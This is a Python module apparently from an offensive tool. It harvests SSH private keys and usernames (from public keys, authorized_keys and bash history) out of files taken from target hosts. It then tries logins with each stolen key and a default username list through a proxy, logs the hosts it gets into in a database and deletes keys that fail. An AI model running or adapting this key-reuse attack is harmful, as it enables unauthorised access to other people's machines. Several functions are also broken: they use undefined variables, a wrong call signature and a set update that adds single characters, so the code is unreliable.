from pathlib import Path
import os
import sys
import ipaddress
import sqlite3

from executors.ssh_walker import Target as SSHTarget
from parsers.parser_helpers import get_directories
from parsers.parser_helpers import test_ipaddress
from parsers.parser_helpers import test_directory
from parsers.parser_helpers import ensure_downloads

# should add support for putty and other ssh clients 

# get all file paths with .ssh in them 
def get_ssh_files(file_list: list):
    ssh_files = []
    for file in file_list:
        posix_path_str = str(file)
        parts = posix_path_str.split("/")
        if ".ssh" in parts:
            if test_directory(file):
                continue
            ssh_files.append(file)
    return ssh_files

def get_bash_history_files():
    bash_hist_files = []
    for file in file_list:
        posix_path_str = str(file)
        parts = posix_path_str.split("/")
        if (parts[0] == "home" and parts[2] == ".bash_history") or (parts[1] == "home" and parts[3] == ".bash_history"):
            if test_directory(file):
                continue
            bash_hist_files.append(posix_path_str)
    return bash_hist_files

            
# test if a file is a private key
# this isnt an ideal solution but just a stop gap until a better one is found
def get_private_key(ssh_files: list):
    private_keys_found = []
    for file in ssh_files:
        with open(file, "r") as fp:
            top_line = fp.readline()
            if "-----" in top_line:
                private_keys_found.append(file)
    return private_keys_found
                
def get_public_keys(ssh_files: list):
    # pub keys could be in two spots, the authorized_keys
    # or just a .pub on the file system
    public_keys_found = []
    for file in ssh_files:
        str_file_path = str(file)
        if str_file_path.split("/")[-1] == "authorized_keys":
            public_keys_found.append(file)
        elif ".pub" in str_file_path.split("/")[-1]:
            public_keys_found.append(file)
    return public_keys_found


def get_username_from_file_contents(contents: list):
    valid_usernames = set()
    blacklist = ["generated-by-azure", "imported-openssh-key"]
    for line in contents:
        if len(line.split(" ")) != 3:
            continue # means no username at the end ssh-xxxx keyvaluehere root@targets
        else:
            username = line.split(" ")[-1].strip()
            if username in blacklist:
                continue
            else:
                if "@" in username:
                    valid_usernames.add(username.split("@")[0])
                else:
                    valid_usernames.add(username)
    return valid_usernames

def get_username_from_bash_history(contents: list):
    valid_usernames = set()
    for line in contents:
        line_parts = line.split(" ")
        if line_parts[0] != "cd":
            continue
        if len(line_parts) == 1:
            continue # example: cd (no path)
        # we know cd starts the line and there is likely a path 
        path_parts = line_parts[1].split("/")
        if path_parts[0] == '':
            username = path_parts[2]
        else:
            username = path_parts[1]
        valid_usernames.update(username)
    return valid_usernames


def get_contents_from_pub_keys(public_keys: list):
    all_usernames = set()
    for file in public_keys:
        # its either a pub or its authorized_keys
        with open(file, "r") as fp:
            file_lines = fp.readlines()
        all_usernames.update(get_username_from_file_contents(file_lines))
    return all_usernames

def get_content_from_bash_histories(bash_file_files: list):
    all_usernames = set()
    for file in bash_file_files:
        with open(file, "r") as fp:
            file_lines = fp.readlines()
        all_usernames.update(get_username_from_bash_history(file_files))
    return all_usernames

def get_all_targets(proxy_host_port: str):
    if not ensure_downloads():
        print("[-] No downloads directory found. Run a scan with -e first to download files.")
        return
    for target in os.listdir("downloads"):
        if not test_ipaddress(target):
            continue
        downloaded_files = get_directories(os.path.join("downloads", target))
        ssh_files = get_ssh_files(downloaded_files)
        
        bash_hist_files = get_bash_history_files(downloaded_files)
        if len(ssh_files) == 0 and len(bash_hist_files) == 0:
            continue
        # get all usernames here
        bash_hist_usernames = get_content_from_bash_histories(bash_hist_files)
        print(f"bash hist usernames found: {bash_hist_usernames}")

        # get a list of all the targets private keys
        list_of_private_keys = get_private_key(ssh_files)
        # get a list of all the targets public keys 
        list_of_public_keys = get_public_keys(ssh_files)
        # parse the public keys for valid usernames and get a list of valid usernames
        usernames_ssh_keys = get_contents_from_pub_keys(list_of_public_keys)
        usernames_comb = usernames_ssh_keys.union(bash_hist_usernames)
        do_executor(target, usernames_comb, list_of_private_keys, proxy_host_port)


def do_executor(target: str, usernames_from_pub_keys: set, priv_keys: list, proxy_host_port: str):
    usernames = ["root", "admin", "test", "guest", "info", "adm",
                 "mysql", "user", "ubuntu", "administrator", "oracle", "ftp",
                 "pi", "debian", "ansible", "ec2-user", "vagrant",
                 "azureuser"]
    comb_usernames = list(usernames_from_pub_keys) + usernames
    for priv_key in priv_keys:
        os.chmod(priv_key, 0o600)
        for name in comb_usernames:
            ssh_target = SSHTarget(proxy_host_port, target, 22, name, key=str(priv_key))
            print(f"[*] {proxy_host_port} -> {ssh_target.username}@{ssh_target.host}:{ssh_target.port} {ssh_target.key}")
            client, sock = ssh_target.create_client()
            if sock == None:
                os.remove(priv_key)
                return # ssh server not listening, move on to the next host
            if ssh_target.connect_key(client, sock):
                write_accessed_host(ssh_target.host, ssh_target.port, ssh_target.username, ssh_target.key)
                return # moves onto the next target
        # we failed do your cleanup here
        os.remove(priv_key)
        # should also see if there is a matching public key and remove that too



def write_accessed_host(host: str, port: int, username: str, key: str):
    # should also likely write the key data, can with open it here
    conn = sqlite3.connect("db/database.db")
    cursor = conn.cursor()
    # we can update the data in this table when the survey is done
    cursor.execute("INSERT INTO AccessedHosts (ip_addr, port, username, key) VALUES (?, ?, ?, ?)", (host, port, username, key))
    conn.commit()
    conn.close()


